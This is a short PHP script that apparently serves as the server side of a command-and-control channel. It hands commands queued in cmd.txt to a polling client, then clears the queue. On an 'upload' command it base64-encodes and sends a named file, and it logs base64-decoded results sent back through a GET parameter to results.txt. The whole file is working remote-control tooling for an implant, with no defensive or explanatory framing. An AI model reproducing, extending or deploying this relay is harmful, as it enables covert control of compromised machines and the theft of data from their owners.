<?php
 # Must be migrated in python
 ############################
 
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
 header("Pragma: no-cache");
 $result = str_replace("_", "+", $_GET['arg']); # This is needed to fix "+"s
 $data=base64_decode($result);
 $a=file_get_contents("cmd.txt");
 $words=explode(" ",$a);
 if (count($words)>1) {
    if ($words[0]==="upload") {
      $b=file_get_contents($words[1]);
      $a="__BASE64__".$words[1]."__ENDNAME__".(base64_encode($b));
    }
 }
 echo $a;
 file_put_contents("cmd.txt", "");
 file_put_contents("./results.txt", $data, FILE_APPEND);
 sleep(1);
?>
